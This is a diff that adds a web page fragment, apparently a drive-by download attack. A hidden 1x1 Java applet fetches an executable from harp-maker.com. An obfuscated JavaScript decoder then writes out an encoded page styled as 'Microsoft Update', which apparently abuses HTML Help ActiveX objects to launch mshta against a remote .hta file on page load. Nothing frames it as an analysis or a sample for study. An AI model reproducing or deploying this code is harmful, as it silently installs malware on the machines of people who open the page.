@@ -1,0 +1,18 @@
+   <object data=in.html></object>
+   <applet archive="java.jar" code="GetAccess.class" width=1   height=1>
+       <param NAME="ModulePath" value="http://harp-maker.com/pages/test.exe"></applet>
+   </APPLET>
+   <script>
+   <!--
+   function decodeTxt(s){
+   var s1=unescape(s.substr(0,s.length-1));
+   var t='';
+   for(i=0;i<s1.length;i++)t+=String.fromCharCode(s1.charCodeAt(i)-s.substr(s.length-1,1));
+   return unescape(t);
+   }
+
+   document.write(decodeTxt('*8Hxhwnuy*75qfslzflj*8I*77of%7Bfxhwnuy*77*8Jkzshynts*75iK*7%3Dx*7%3E*%3CG%7Bfw*75x6*8Izsjxhfuj*7%3Dx3xzgxyw*7%3D5*7Hx3qjslym26*7%3E*7%3E*8G*75%7Bfw*75y*8I*7%3C*7%3C*8Gktw*7%3Dn*8I5*8Gn*8Hx63qjslym*8Gn00*7%3Ey0*8IXywnsl3kwtrHmfwHtij*7%3Dx63hmfwHtijFy*7%3Dn*7%3E2x3xzgxyw*7%3Dx3qjslym26*7H6*7%3E*7%3E*8Githzrjsy3%7Cwnyj*7%3Dzsjxhfuj*7%3Dy*7%3E*7%3E*8G*%3CI*8H4xhwnuy*8J5'));
+
+   dF('%264Diunm%264F%261E%261B%264Difbe%264F%261E%261B%264Dnfub%2631iuuq.frvjw%264E%2633Dpoufou.Uzqf%2633%2631dpoufou%264E%2633ufyu0iunm%264C%2631dibstfu%264Exjoepxt.2362%2633%264F%261E%261B%264Dujumf%264FNjdsptpgu%2631Vqebuf%264D0ujumf%264F%261E%261B%264Dnfub%2631obnf%264E%2633bvuips%2633%2631dpoufou%264E%2633ypdf%2633%264F%261E%261B%264D0ifbe%264F%261E%261B%264Dcpez%264F%261E%261B%264Dtuzmf%264F%2634y3%263D%2634y4%268Cqptjujpo%264Bbctpmvuf%264Cmfgu%264B.2111%264C%268E%264D0tuzmf%264F%261E%261B%264DPCKFDU%2631je%264Ey3%2631dmbttje%264Edmtje%264Bbec991b7.e9gg.22dg.%3A488.11bb114c8b22%2631tuzmf%264E%2633qptjujpo%264Bbctpmvuf%264Cmfgu%264B.2111%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Dpnnboe%2633%2631WBMVF%264E%2633Sfmbufe%2631Upqjdt%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Cvuupo%2633%2631WBMVF%264E%2633Ufyu%264B%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Xjoepx%2633%2631WBMVF%264E%2633%2635hmpcbm%60cmbol%2633%264F%261E%261B%264Dqbsbn%2631obnf%264E%2633Tdspmmcbst%2633%2631wbmvf%264E%2633usvf%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Jufn2%2633%2631WBMVF%264E%2633dpnnboe%264Cnt.jut%264Bjdxejbm/din%264B%264B0jdx%60pwfswjfx/iun%2633%264F%264D0PCKFDU%264F%261E%261B%264Dtdsjqu%264FtfuUjnfpvu%2639%2638y3/IIDmjdl%2639%263%3A%264C%2638%263D2111%263%3A%264C%264D0tdsjqu%264F%261E%261B%264DPCKFDU%2631je%264Ey4%2631dmbttje%264Edmtje%264Bbec991b7.e9gg.22dg.%3A488.11bb114c8b22%2631tuzmf%264E%2633qptjujpo%264Bbctpmvuf%264Cmfgu%264B.2111%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Dpnnboe%2633%2631WBMVF%264E%2633Sfmbufe%2631Upqjdt%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Cvuupo%2633%2631WBMVF%264E%2633Ufyu%264B%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Xjoepx%2633%2631WBMVF%264E%2633%2635hmpcbm%60cmbol%2633%264F%261E%261B%264DQBSBN%2631OBNF%264E%2633Jufn2%2633%2631WBMVF%264E%2633dpnnboe%264Ckbwbtdsjqu%264Bepdvnfou/mjolt%266C1%266E/isfg%264E%2638FYFD%264E%263Dntiub%263Diuuq%264B00ibsq.nblfs/dpn0qbhft0qqq/iub%2631%2631DIN%264Ejftibsfe/din%2631GJMF%264Ebqq%60jotubmm/iun%2638%26364Cepdvnfou/mjolt%266C1%266E/dmjdl%2639%263%3A%264C%2633%264F%264D0PCKFDU%264F%261E%261B%264Dtdsjqu%264FtfuUjnfpvu%2639%2638y4/IIDmjdl%2639%263%3A%264C%2638%263D3111%263%3A%264C%264D0tdsjqu%264F%261E%261B%264D0cpez%264F%261E%261B%264D0iunm%264F1')
+
+   </script>
